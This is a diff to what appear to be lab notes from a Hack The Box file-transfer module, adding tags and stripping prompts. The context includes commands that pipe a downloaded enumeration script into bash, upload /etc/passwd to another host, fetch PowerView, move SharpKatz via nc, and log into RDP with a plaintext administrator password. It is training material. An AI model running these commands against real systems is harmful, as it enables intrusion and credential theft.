@@ -8,6 +8,7 @@ h@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.github
 ```shell
 h@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
 ```
+[[python]]
 
 #### PHP
 ```shell
@@ -22,6 +23,7 @@ fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", 
 ```shell
 h@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
 ```
+[[php]]
 
 #### Ruby
 ```shell
@@ -31,8 +33,9 @@ h@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get
 ```shell
 h@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
 ```
+[[ruby]]
 
-#### JS
+#### JS [[js]]
 Create wget.js:
 ```javascript
 var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
@@ -45,7 +48,7 @@ BinStream.Write(WinHttpReq.ResponseBody);
 BinStream.SaveToFile(WScript.Arguments(1));
 ```
 Run:
-```cmd-session
+```powershell
 C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
 ```
 
@@ -71,15 +74,16 @@ C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShel
 ## Upload
 
 ```shell
-h@htb[/htb]$ python3 -m uploadserver 
+python3 -m uploadserver 
 ```
 
 ```shell
-h@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
+python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
 ```
 
 ## Misc
 
+[[ncat]] [[nc]] 
 Recieve
 ```shell-session
 victim@target:~$ nc -l -p 8000 > SharpKatz.exe
@@ -146,12 +150,12 @@ PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destin
 ```
 
 #### RDP
-
+[[rdp]]
 ```shell
-jabrach@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
 ```
 
 ```shell
-jabrach@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
 ```
 
